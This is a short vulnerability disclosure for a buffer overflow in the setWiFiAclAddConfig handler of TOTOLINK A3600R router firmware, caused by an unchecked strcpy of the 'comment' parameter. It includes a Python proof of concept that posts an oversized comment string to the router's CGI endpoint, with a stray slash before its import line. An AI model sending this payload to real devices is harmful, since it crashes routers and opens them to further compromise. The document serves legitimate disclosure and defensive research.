## Overview

- Manufacturer's website information：https://www.totolink.net/
- Firmware download address ：https://www.totolink.cn/home/menu/detail.html?menu_listtpl=download&id=63&ids=36

## Affected version

A3600R V4.1.2cu.5182_B20201102

## Vulnerability details

In the A3600R V4.1.2cu.5182_B20201102 firmware has a buffer overflow vulnerability in the `setWiFiAclAddConfig` function. The `v12` variable receives the `comment` parameter from a POST request. However, since the user can control the input of `comment`, the `strcpy(v26, (const char *)v12);` can cause a buffer overflow vulnerability.

![image-20240721015949402](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240721015949402.png)

## POC

```python
/import requests
url = "http://127.0.0.1/cgi-bin/cstecgi.cgi"
cookie = {"Cookie":"SESSION_ID=2:1721039211:2"}
data = {"comment":"a"*0x1000,"topicurl":"setWiFiAclAddConfig"}
response = requests.post(url, cookies=cookie, json=data)
print(response.text)
print(response)
```

![image-20240721015356613](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240721015356613.png)
